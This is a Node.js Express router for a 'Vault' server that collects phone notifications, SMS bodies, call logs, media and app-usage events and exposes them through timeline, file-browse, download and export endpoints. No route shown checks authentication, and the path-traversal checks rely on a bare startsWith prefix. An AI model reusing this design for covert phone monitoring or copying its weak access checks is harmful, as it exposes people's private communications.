const express = require('express');
const router = express.Router();
const fs = require('fs');
const path = require('path');
const archiverModule = require('archiver');
const config = require('../config/config');
const { getDatabase } = require('../database/database');
const logger = require('../utils/logger');

function createZipArchive(options = { zlib: { level: 9 } }) {
  if (typeof archiverModule === 'function') {
    return archiverModule('zip', options);
  }
  if (archiverModule.ZipArchive) {
    return new archiverModule.ZipArchive(options);
  }
  if (archiverModule.default) {
    return archiverModule.default('zip', options);
  }
  throw new Error('Archiver module could not be initialized');
}

// 60 seconds heartbeat threshold for live device status (stable background network tracking)
const ONLINE_THRESHOLD_MS = 60 * 1000;

/**
 * GET /api/web/devices
 * Lists all registered devices with live online/offline status, last seen IP & time, and total counts.
 */
router.get('/devices', (req, res) => {
  try {
    const db = getDatabase();
    const now = Date.now();

    const devices = db.prepare(`
      SELECT 
        id,
        device_id,
        device_name,
        created_at,
        last_seen
      FROM devices
      ORDER BY last_seen DESC
    `).all();

    const result = devices.map(d => {
      const isOnline = d.last_seen ? (now - d.last_seen) < ONLINE_THRESHOLD_MS : false;

      // Get count of items synced from this device
      const notifCount = db.prepare('SELECT COUNT(*) as cnt FROM notifications WHERE device_id = ?').get(d.device_id).cnt;
      const telecomCount = db.prepare('SELECT COUNT(*) as cnt FROM telecom_logs WHERE device_id = ?').get(d.device_id).cnt;
      const mediaCount = db.prepare('SELECT COUNT(*) as cnt FROM media_files WHERE device_id = ?').get(d.device_id).cnt;

      return {
        id: d.id,
        device_id: d.device_id,
        device_name: d.device_name || 'Unnamed Device',
        created_at: d.created_at,
        last_seen: d.last_seen,
        is_online: isOnline,
        last_seen_formatted: d.last_seen ? new Date(d.last_seen).toLocaleString() : 'Never',
        counts: {
          notifications: notifCount,
          telecom: telecomCount,
          media: mediaCount,
          total: notifCount + telecomCount + mediaCount
        }
      };
    });

    res.json({
      success: true,
      devices: result
    });
  } catch (error) {
    logger.error('WEB', `Error fetching device status: ${error.message}`);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * POST /api/web/device/rename
 * Renames a registered device in the database.
 */
router.post('/device/rename', (req, res) => {
  try {
    const { device_id, new_name } = req.body;
    if (!device_id || !new_name) {
      return res.status(400).json({ success: false, error: 'device_id and new_name required' });
    }

    const db = getDatabase();
    db.prepare('UPDATE devices SET device_name = ? WHERE device_id = ?').run(new_name.trim(), device_id);

    logger.info('WEB', `Renamed device ${device_id} to "${new_name.trim()}"`);
    res.json({ success: true, device_id, new_name: new_name.trim() });
  } catch (error) {
    logger.error('WEB', `Error renaming device: ${error.message}`);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * GET /api/web/stats
 * Overview stats counter.
 */
router.get('/stats', (req, res) => {
  try {
    const db = getDatabase();

    const notifCount = db.prepare('SELECT COUNT(*) as cnt FROM notifications').get().cnt;
    const smsCount = db.prepare("SELECT COUNT(*) as cnt FROM telecom_logs WHERE type = 'sms'").get().cnt;
    const callCount = db.prepare("SELECT COUNT(*) as cnt FROM telecom_logs WHERE type = 'call'").get().cnt;
    const mediaCount = db.prepare('SELECT COUNT(*) as cnt FROM media_files').get().cnt;
    const deviceCount = db.prepare('SELECT COUNT(*) as cnt FROM devices').get().cnt;

    // Storage size estimate
    let totalBytes = 0;
    const mediaFiles = db.prepare('SELECT file_size FROM media_files').all();
    mediaFiles.forEach(f => totalBytes += (f.file_size || 0));

    res.json({
      success: true,
      stats: {
        notifications: notifCount,
        sms: smsCount,
        calls: callCount,
        media: mediaCount,
        devices: deviceCount,
        storage_bytes: totalBytes,
        storage_formatted: (totalBytes / (1024 * 1024)).toFixed(2) + ' MB'
      }
    });
  } catch (error) {
    logger.error('WEB', `Error fetching stats: ${error.message}`);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * GET /api/web/app-usage
 * Returns app usage history (which app was opened at what time by which device).
 */
router.get('/app-usage', (req, res) => {
  try {
    const db = getDatabase();
    const { device_id, limit = 100 } = req.query;

    const devList = db.prepare('SELECT device_id, device_name FROM devices').all();
    const devMap = {};
    devList.forEach(d => { devMap[d.device_id] = d.device_name || d.device_id; });

    let sqlSensors = "SELECT id, device_id, payload_json, timestamp FROM sensor_logs WHERE type = 'app_usage'";
    const paramsS = [];
    if (device_id) { sqlSensors += ' AND device_id = ?'; paramsS.push(device_id); }
    sqlSensors += ` ORDER BY timestamp DESC LIMIT ${parseInt(limit)}`;

    const sensorRows = db.prepare(sqlSensors).all(paramsS);
    const usageList = sensorRows.map(r => {
      let parsed = {};
      try { parsed = JSON.parse(r.payload_json); } catch {}
      return {
        id: r.id,
        device_id: r.device_id,
        device_name: devMap[r.device_id] || r.device_id || 'Phone',
        app_name: parsed.app_name || 'App',
        package_name: parsed.package_name || '',
        event: parsed.event || 'OPENED',
        timestamp: r.timestamp,
        date_formatted: new Date(r.timestamp).toLocaleString('en-IN', { hour: '2-digit', minute: '2-digit', second: '2-digit', day: '2-digit', month: 'short', year: 'numeric' })
      };
    });

    // Also collect app activity from notifications
    let sqlNotifs = "SELECT id, device_id, app_name, title, timestamp FROM notifications";
    const paramsN = [];
    if (device_id) { sqlNotifs += ' WHERE device_id = ?'; paramsN.push(device_id); }
    sqlNotifs += ` ORDER BY timestamp DESC LIMIT ${parseInt(limit)}`;

    const notifRows = db.prepare(sqlNotifs).all(paramsN);
    const notifUsage = notifRows.map(r => ({
      id: 'n_' + r.id,
      device_id: r.device_id,
      device_name: devMap[r.device_id] || r.device_id || 'Phone',
      app_name: r.app_name || 'App',
      package_name: '',
      event: 'ACTIVE_USAGE',
      timestamp: r.timestamp,
      date_formatted: new Date(r.timestamp).toLocaleString('en-IN', { hour: '2-digit', minute: '2-digit', second: '2-digit', day: '2-digit', month: 'short', year: 'numeric' })
    }));

    const combined = [...usageList, ...notifUsage];
    combined.sort((a, b) => b.timestamp - a.timestamp);

    res.json({
      success: true,
      count: combined.length,
      items: combined.slice(0, parseInt(limit))
    });
  } catch (error) {
    logger.error('WEB', `Error fetching app usage: ${error.message}`);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * GET /api/web/timeline
 * Data lineage query across notifications, SMS, calls, and media.
 */
router.get('/timeline', (req, res) => {
  try {
    const db = getDatabase();
    const { category, device_id, search, limit = 50 } = req.query;

    let items = [];

    if (!category || category === 'all' || category === 'notifications') {
      let sql = "SELECT id, client_event_id, device_id, app_name as source, title, content as body, timestamp, 'notification' as category FROM notifications";
      const params = [];
      const conditions = [];

      if (device_id) { conditions.push('device_id = ?'); params.push(device_id); }
      if (search) { conditions.push('(title LIKE ? OR content LIKE ? OR app_name LIKE ?)'); params.push(`%${search}%`, `%${search}%`, `%${search}%`); }

      if (conditions.length > 0) sql += ' WHERE ' + conditions.join(' AND ');
      sql += ` ORDER BY timestamp DESC LIMIT ${parseInt(limit)}`;

      items.push(...db.prepare(sql).all(params));
    }

    if (!category || category === 'all' || category === 'telecom') {
      let sql = "SELECT id, client_event_id, device_id, type as source, party as title, body, timestamp, 'telecom' as category FROM telecom_logs";
      const params = [];
      const conditions = [];

      if (device_id) { conditions.push('device_id = ?'); params.push(device_id); }
      if (search) { conditions.push('(party LIKE ? OR body LIKE ?)'); params.push(`%${search}%`, `%${search}%`); }

      if (conditions.length > 0) sql += ' WHERE ' + conditions.join(' AND ');
      sql += ` ORDER BY timestamp DESC LIMIT ${parseInt(limit)}`;

      items.push(...db.prepare(sql).all(params));
    }

    if (!category || category === 'all' || category === 'media') {
      let sql = "SELECT id, client_event_id, device_id, mime_type as source, original_name as title, local_path as body, file_size, timestamp, 'media' as category FROM media_files";
      const params = [];
      const conditions = [];

      if (device_id) { conditions.push('device_id = ?'); params.push(device_id); }
      if (search) { conditions.push('(original_name LIKE ? OR local_path LIKE ?)'); params.push(`%${search}%`, `%${search}%`); }

      if (conditions.length > 0) sql += ' WHERE ' + conditions.join(' AND ');
      sql += ` ORDER BY timestamp DESC LIMIT ${parseInt(limit)}`;

      items.push(...db.prepare(sql).all(params));
    }


    // Retrieve device names map
    const devList = db.prepare('SELECT device_id, device_name FROM devices').all();
    const devMap = {};
    devList.forEach(d => { devMap[d.device_id] = d.device_name || d.device_id; });

    // Sort combined timeline by timestamp descending
    items.sort((a, b) => b.timestamp - a.timestamp);
    items = items.slice(0, parseInt(limit));

    const formatted = items.map(item => ({
      ...item,
      device_name: devMap[item.device_id] || item.device_id || 'Unknown Device',
      date_formatted: new Date(item.timestamp).toLocaleString()
    }));

    res.json({
      success: true,
      count: formatted.length,
      items: formatted
    });
  } catch (error) {
    logger.error('WEB', `Error fetching timeline: ${error.message}`);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * GET /api/web/files?subpath=media/2026/09
 * Directory & file listing for Vault file system browser.
 */
router.get('/files', (req, res) => {
  try {
    const rootDir = path.resolve(config.storageRoot);
    const reqSubpath = req.query.subpath || '';
    const targetPath = path.resolve(rootDir, reqSubpath);

    // Prevent directory traversal attacks
    if (!targetPath.startsWith(rootDir)) {
      return res.status(403).json({ success: false, error: 'Access denied: Path outside storage root' });
    }

    if (!fs.existsSync(targetPath)) {
      return res.json({ success: true, current_path: reqSubpath, parent_path: null, files: [] });
    }

    const entries = fs.readdirSync(targetPath, { withFileTypes: true });

    const result = entries.map(entry => {
      const fullPath = path.join(targetPath, entry.name);
      const relativePath = path.relative(rootDir, fullPath).replace(/\\/g, '/');
      let stats = {};
      try {
        stats = fs.statSync(fullPath);
      } catch {}

      return {
        name: entry.name,
        is_directory: entry.isDirectory(),
        relative_path: relativePath,
        size_bytes: entry.isDirectory() ? 0 : (stats.size || 0),
        size_formatted: entry.isDirectory() ? '--' : (stats.size ? (stats.size / 1024).toFixed(1) + ' KB' : '0 KB'),
        modified: stats.mtime ? new Date(stats.mtime).toLocaleString() : 'Unknown'
      };
    });

    // Sort directories first, then files alphabetically
    result.sort((a, b) => {
      if (a.is_directory !== b.is_directory) return b.is_directory ? 1 : -1;
      return a.name.localeCompare(b.name);
    });

    const parentSubpath = reqSubpath ? path.dirname(reqSubpath).replace(/\\/g, '/') : null;

    res.json({
      success: true,
      root_path: rootDir,
      current_subpath: reqSubpath.replace(/\\/g, '/'),
      parent_subpath: parentSubpath === '.' ? '' : parentSubpath,
      files: result
    });
  } catch (error) {
    logger.error('WEB', `Error scanning directory: ${error.message}`);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * GET /api/web/download?file=media/2026/09/sample.jpg
 * Download a single file.
 */
router.get('/download', (req, res) => {
  try {
    const rootDir = path.resolve(config.storageRoot);
    let reqFile = req.query.file;

    if (!reqFile) {
      return res.status(400).json({ success: false, error: 'File parameter is required' });
    }

    // Strip lead drive/root if passed full path
    if (reqFile.toLowerCase().startsWith(rootDir.toLowerCase())) {
      reqFile = reqFile.substring(rootDir.length);
    }
    reqFile = reqFile.replace(/^[/\\]+/, '');

    const targetPath = path.resolve(rootDir, reqFile);

    // Prevent path traversal
    if (!targetPath.toLowerCase().startsWith(rootDir.toLowerCase())) {
      return res.status(403).json({ success: false, error: 'Access denied' });
    }

    if (!fs.existsSync(targetPath) || fs.statSync(targetPath).isDirectory()) {
      return res.status(404).json({ success: false, error: 'File not found' });
    }

    res.download(targetPath);
  } catch (error) {
    logger.error('WEB', `Error downloading file: ${error.message}`);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * POST /api/web/download-batch
 * Download selected files as a ZIP archive.
 */
router.post('/download-batch', (req, res) => {
  try {
    const { files } = req.body;
    if (!Array.isArray(files) || files.length === 0) {
      return res.status(400).json({ success: false, error: 'No files provided for batch download' });
    }

    const rootDir = path.resolve(config.storageRoot);

    res.attachment(`Vault_Export_${Date.now()}.zip`);
    const archive = createZipArchive({ zlib: { level: 9 } });

    archive.on('error', (err) => {
      logger.error('WEB', `Archive error: ${err.message}`);
      res.status(500).end();
    });

    archive.pipe(res);

    files.forEach(relPath => {
      const fullPath = path.resolve(rootDir, relPath);
      if (fullPath.startsWith(rootDir) && fs.existsSync(fullPath)) {
        const stat = fs.statSync(fullPath);
        if (stat.isFile()) {
          archive.file(fullPath, { name: path.basename(fullPath) });
        } else if (stat.isDirectory()) {
          archive.directory(fullPath, path.basename(fullPath));
        }
      }
    });

    archive.finalize();
  } catch (error) {
    logger.error('WEB', `Error creating ZIP archive: ${error.message}`);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * POST /api/web/export-selected
 * Export ONLY selected notification/telecom/media records to CSV or JSON.
 */
router.post('/export-selected', (req, res) => {
  try {
    const { items, format = 'csv' } = req.body;
    if (!Array.isArray(items) || items.length === 0) {
      return res.status(400).json({ success: false, error: 'No items selected for export' });
    }

    if (format === 'json') {
      res.setHeader('Content-Type', 'application/json');
      res.setHeader('Content-Disposition', `attachment; filename=Vault_Selected_Export_${Date.now()}.json`);
      return res.send(JSON.stringify(items, null, 2));
    }

    // Default: CSV format
    const headers = ['Category', 'Source / App', 'Title / Contact', 'Content / Details', 'Timestamp', 'Device ID'];
    const csvRows = [headers.join(',')];

    items.forEach(item => {
      const row = [
        `"${(item.category || '').replace(/"/g, '""')}"`,
        `"${(item.source || '').replace(/"/g, '""')}"`,
        `"${(item.title || '').replace(/"/g, '""')}"`,
        `"${(item.body || '').replace(/"/g, '""')}"`,
        `"${(item.date_formatted || new Date(item.timestamp).toLocaleString()).replace(/"/g, '""')}"`,
        `"${(item.device_id || '').replace(/"/g, '""')}"`
      ];
      csvRows.push(row.join(','));
    });

    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename=Vault_Selected_Export_${Date.now()}.csv`);
    res.send(csvRows.join('\n'));
  } catch (error) {
    logger.error('WEB', `Error exporting selected items: ${error.message}`);
    res.status(500).json({ success: false, error: error.message });
  }
});

/**
 * POST /api/web/backup-db
 * Create an automated ZIP archive backup of vault.db in C:\Vault\backups.
 */
router.post('/backup-db', (req, res) => {
  try {
    const dbPath = path.resolve(config.databasePath);
    const backupsDir = path.join(config.storageRoot, 'backups');

    if (!fs.existsSync(backupsDir)) {
      fs.mkdirSync(backupsDir, { recursive: true });
    }

    const backupFileName = `vault_db_backup_${Date.now()}.zip`;
    const backupFilePath = path.join(backupsDir, backupFileName);

    const output = fs.createWriteStream(backupFilePath);
    const archive = createZipArchive({ zlib: { level: 9 } });

    output.on('close', () => {
      logger.info('WEB', `Database backup archive created: ${backupFilePath} (${archive.pointer()} bytes)`);
      res.json({
        success: true,
        message: 'Database backup created successfully',
        file_name: backupFileName,
        file_path: backupFilePath,
        size_bytes: archive.pointer()
      });
    });

    archive.on('error', (err) => {
      logger.error('WEB', `Backup error: ${err.message}`);
      res.status(500).json({ success: false, error: err.message });
    });

    archive.pipe(output);
    if (fs.existsSync(dbPath)) {
      archive.file(dbPath, { name: 'vault.db' });
    }
    archive.finalize();
  } catch (error) {
    logger.error('WEB', `Error creating database backup: ${error.message}`);
    res.status(500).json({ success: false, error: error.message });
  }
});

module.exports = router;

